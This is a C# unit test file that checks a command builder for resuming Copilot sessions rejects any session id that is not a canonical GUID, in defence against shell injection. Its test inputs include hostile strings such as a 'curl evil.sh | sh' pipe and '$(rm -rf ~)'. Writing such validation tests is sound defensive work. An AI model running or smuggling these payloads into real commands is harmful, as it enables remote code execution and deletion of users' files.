using Searchlight.Services;
using Xunit;

namespace Searchlight.Core.Tests;

/// <summary>
/// Covers the Copilot resume command builder's trust boundary: session ids
/// come from on-disk folder names, so anything that isn't a canonical dashed
/// GUID must be rejected before it can reach a shell.
/// </summary>
public sealed class CopilotResumeCommandTests
{
    private const string ValidId = "56a048ce-7a66-4bb5-8f87-de5a34a7274b";

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("x; curl evil.sh | sh #")]
    [InlineData("$(rm -rf ~)")]
    [InlineData("`touch /tmp/pwned`")]
    [InlineData("56a048ce-7a66-4bb5-8f87-de5a34a7274b; echo pwned")]
    // Non-canonical GUID formats carry shell-active {},() — only "D" is accepted.
    [InlineData("{56a048ce-7a66-4bb5-8f87-de5a34a7274b}")]
    [InlineData("(56a048ce-7a66-4bb5-8f87-de5a34a7274b)")]
    [InlineData("56a048ce7a664bb58f87de5a34a7274b")]
    public void NonGuidSessionIds_AreRejected(string? sessionId)
    {
        Assert.False(CopilotResumeCommand.IsValidSessionId(sessionId));
        Assert.False(CopilotResumeCommand.TryBuild(sessionId, yolo: false, out string command));
        Assert.Equal(string.Empty, command);
    }

    [Fact]
    public void ValidId_BuildsResumeInvocation()
    {
        Assert.True(CopilotResumeCommand.TryBuild(ValidId, yolo: false, out string command));
        Assert.Equal($"copilot --resume={ValidId}", command);
    }

    [Fact]
    public void Yolo_AppendsFlag()
    {
        Assert.True(CopilotResumeCommand.TryBuild(ValidId, yolo: true, out string command));
        Assert.Equal($"copilot --resume={ValidId} --yolo", command);
    }
}
